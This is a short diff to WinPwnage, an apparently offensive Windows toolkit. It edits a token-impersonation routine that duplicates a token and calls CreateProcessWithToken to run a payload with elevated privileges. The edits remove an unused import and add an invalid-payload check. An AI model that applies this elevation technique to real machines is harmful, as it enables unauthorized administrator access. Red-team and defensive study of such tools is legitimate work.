@@ -1,7 +1,6 @@
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 from winpwnage.core.winstructures import *
-import os
 
 #Creds to: https://gist.github.com/highsenburger69/147a16dd003b2fd1eacd9afcd1d0fe7f
 
@@ -78,4 +77,7 @@ def elevate_token_impersonation(payload):
 						if CreateProcessWithToken(hTokendupe, 0x00000002, payload, None, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
 							print_error("Error while triggering admin payload using CreateProcessWithLogonW: {}".format(GetLastError()))
 						else:
-							print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))
+							print_success("Successfully elevated process PID: {}".format(lpProcessInformation.dwProcessId))							
+	else:
+		print_error("Cannot proceed, invalid payload")
+		return False
